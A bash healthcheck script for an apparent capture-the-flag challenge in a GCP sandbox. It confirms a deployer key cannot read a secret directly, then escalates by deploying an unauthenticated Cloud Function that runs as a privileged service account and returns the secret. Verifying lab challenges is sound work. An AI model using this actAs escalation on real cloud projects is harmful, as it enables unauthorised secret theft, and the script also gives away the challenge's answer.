#!/usr/bin/env bash
# h02 healthcheck (runs in the provisioned sandbox): prove the deployer key CANNOT
# read the secret directly, but CAN by deploying a function that runs as the
# privileged runtime SA. This is the intended actAs escalation.
set -euo pipefail
source "$(git rev-parse --show-toplevel)/shared/lib/common.sh"; load_env
source "$REPO_ROOT/shared/lib/gcp.sh"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SECRET="ruhunu-crownjewels"; CORE_EMAIL="ruhunu-core@${GCP_PROJECT_ID}.iam.gserviceaccount.com"
TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT

gcloud auth activate-service-account --key-file="$HERE/deployer-sa-key.json" >/dev/null 2>&1

# 1) direct read MUST fail (deployer has no secretAccessor)
if gcloud --project "$GCP_PROJECT_ID" secrets versions access latest --secret="$SECRET" >/dev/null 2>&1; then
  echo "h02 healthcheck FAILED: deployer can read the secret directly (scope too broad)"; exit 1
fi

# 2) escalate: deploy a function that runs AS the runtime SA and prints the secret
mkdir -p "$TMP/fn"
cat > "$TMP/fn/main.py" <<PY
import functions_framework, subprocess
@functions_framework.http
def f(request):
    return subprocess.check_output(
        ["gcloud","secrets","versions","access","latest","--secret","$SECRET"])
PY
echo "functions-framework==3.*" > "$TMP/fn/requirements.txt"
gcloud --project "$GCP_PROJECT_ID" functions deploy pwn --gen2 --region "$GCP_REGION" \
  --runtime python312 --trigger-http --allow-unauthenticated --entry-point f \
  --service-account "$CORE_EMAIL" --source "$TMP/fn" --quiet >/dev/null
URL="$(gcloud --project "$GCP_PROJECT_ID" functions describe pwn --gen2 --region "$GCP_REGION" --format='value(url)')"
if curl -fsS "$URL" | grep -qE "${FLAG_PREFIX}\{"; then
  echo "h02 healthcheck rc=0"; exit 0
fi
echo "h02 healthcheck FAILED"; exit 1
